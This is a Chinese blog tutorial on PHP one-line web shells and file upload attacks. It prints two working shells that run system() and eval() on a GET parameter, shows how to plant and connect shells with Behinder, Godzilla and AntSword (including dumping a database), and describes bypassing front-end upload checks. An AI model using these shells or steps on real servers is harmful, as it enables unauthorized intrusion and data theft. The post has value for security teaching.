> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/weixin_52177486/article/details/136118038)

### 一句话木马

<?php  @system($_GET['cmd']);?>

<?php  @eval($_GET['cmd']);?>

<?php  ?> 是 [php 代码](https://so.csdn.net/so/search?q=php%E4%BB%A3%E7%A0%81&spm=1001.2101.3001.7020)的标志 system() 命令执行函数  $_GET['cmd'] 接收用户通过 get 方式请求提交的以 cmd 为参数的值 @错误抑制符，用户传进的参数有误也不会直接报错或退出。

![](https://img-blog.csdnimg.cn/direct/43005dd5dc894be49bb79f9828e82339.png)

通过物理机访问

![](https://img-blog.csdnimg.cn/direct/c6664bc790b74c5e96f7d7c5e420facc.png)

成功打开服务器上的计算器。

将执行命令函数换成 eval()

![](https://img-blog.csdnimg.cn/direct/fd614cac8e60446dbe3d0fb08e530974.png)

输入 phpinfo 得到 php 的配置信息

![](https://img-blog.csdnimg.cn/direct/265b3297ff7f42ddb378b15d645fb7b3.png)

system() 是执行系统命令和 eval() 将传进来的值按照 php 代码来执行。

在实战环境中，我们不能看到服务器上的计算器是否正常开启，所以使用可以看到回显的命令，从而确保正常执行，在当前目录下写一个 2.txt 文件，里面存入内容 123123123.

![](https://img-blog.csdnimg.cn/direct/aea6805a98514bff91dd2888c12b1990.png)

访问创建的文件，访问成功即为成功执行

![](https://img-blog.csdnimg.cn/direct/d6c26a0359984b5886571dfa9160a330.png)

也可以使用 dnslog 平台记录得到系统命令执行成功

![](https://img-blog.csdnimg.cn/direct/e11c9ef1d61e4a5988f1ef9f4bbaf99b.png)

![](https://img-blog.csdnimg.cn/direct/797e33bfd77b4b7bbb22e409f03a0abb.png)

### 文件上传工具

#### 冰蝎

1、生成一个马

![](https://img-blog.csdnimg.cn/direct/5153014c93c14b92808394ab03f3ad77.png)

2、将 shell.php 放在被攻击端服务器中

![](https://img-blog.csdnimg.cn/direct/7c27cd284694401c896bcaf27a6d6ca5.png)

3、新增 shell 进行连接

![](https://img-blog.csdnimg.cn/direct/9344aea0daf940ada4ec1b315e2705f7.png)

![](https://img-blog.csdnimg.cn/direct/bccfd6bd556b4d6b815ac108a8c679d2.png)

4、连接成功

![](https://img-blog.csdnimg.cn/direct/4d4b041ef7ae40f59d251a67d5a2c453.png)

5、实现脱库

![](https://img-blog.csdnimg.cn/direct/2d84be3baeec4a9c8e3b7bae6dde4d51.png)

#### 哥斯拉

1、生成马

![](https://img-blog.csdnimg.cn/direct/9667c0a53f054187a2e6b68231d43acb.png)

![](https://img-blog.csdnimg.cn/direct/9af9d046bae147c18dbfa53ce07412be.png)

2、将生成的马放在被攻击服务器的网页根目录下

![](https://img-blog.csdnimg.cn/direct/81802e727cc348caa6c5abc07648ced4.png)

![](https://img-blog.csdnimg.cn/direct/9027b776b3294cb88c681648eac6ea4e.png)

3、哥斯拉进行连接

![](https://img-blog.csdnimg.cn/direct/effffec47c784af4be0864e4ee2b8308.png)

![](https://img-blog.csdnimg.cn/direct/ed0b85d9ae784ac58254600eb6d7f294.png)

连接成功

![](https://img-blog.csdnimg.cn/direct/6b9173ea4b424eb28ee6437d2e66c2d7.png)

4、点击添加，进入

![](https://img-blog.csdnimg.cn/direct/dfd829d47aea4065b097760f43a70289.png)

有终端以及数据库管理等工具

![](https://img-blog.csdnimg.cn/direct/d62de9f897bf436388350802a73c886b.png)

#### 蚁剑

1、将木马放在网页根目录下

![](https://img-blog.csdnimg.cn/direct/f325ca0783b94509ada80bb08bc56a6e.png)

2、通过 蚁剑连接

![](https://img-blog.csdnimg.cn/direct/ba662bbf81c44b8a87472092647c1650.png)

![](https://img-blog.csdnimg.cn/direct/2851ad7796a647d88383ff565004b550.png)

3、成功连接

![](https://img-blog.csdnimg.cn/direct/45b68a0984f441aea19179f171d6fbb8.png)

![](https://img-blog.csdnimg.cn/direct/91d71757ccd74faea371b9cc96255238.png)

除此之外，蚁剑的插件市场还有很多比较好用的工具

![](https://img-blog.csdnimg.cn/direct/f1c3dce208b94b09aa223a1f5a829284.png)

### 文件上传

用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力（上传 web 脚本能够被服务器解析）通常存在于网页主界面（个人资料，提交文档）、后台登录系统以及许多未关闭的接口。

#### 文件上传漏洞挖掘思路

1、判断对方网站使用的是什么服务器、服务器能够解析的脚本语言（asp、jsp、php）。

2、寻找文件上传点（图片提交、接口提交、编辑器提交、文档提交）可以将文件上传到对方服务器的点。

3、判断文件上传的验证规则。

4、寻找脚本上传之后的路径，看是否可以访问到（如果看到空白的页面说明脚本被解析了、如果没有解析脚本会以文本的方式出现在网页上）。

5、使用文件上传工具连接，尝试执行 whoami 命令。

#### 文件上传漏洞实例

1、判断对方服务器，可以通过抓包

![](https://img-blog.csdnimg.cn/direct/7ffce4a3abd2436f8ede0ac68f096cfa.png)

得到是通过 php 编写的

2、找到文件上传点

![](https://img-blog.csdnimg.cn/direct/41475c992360496caf4f42dd7c8f8034.png)

找到一个上传图片的点

3、判断验证方式

上传文件，进行抓包，没有抓到，说明这里的验证是前端 js 验证跳出的弹窗

![](https://img-blog.csdnimg.cn/direct/84e54bb746164be9b3060a219b9db464.png)

发现是前端验证之后 u，关闭 JavaScript 再进行上传就可以绕过前端验证

![](https://img-blog.csdnimg.cn/direct/44546f49bc8540749f2c2851ed055879.png)

4、找到文件上传的路径，在这里直接显示在页面上 uploads/1.php，但在很多真实场景中需要抓包来确定脚本上传的位置。

![](https://img-blog.csdnimg.cn/direct/111a791025cd457094ef0e691495b324.png)

访问后得到一个空白页面，可能是脚本执行成功

5、使用工具进行连接

![](https://img-blog.csdnimg.cn/direct/bc362410509e4c11808b47f1e220770a.png)

成功连接，说明脚本正常上传并且执行。

![](https://img-blog.csdnimg.cn/direct/6c35cbe1d0934372a1ea25c4a3f3e2ee.png)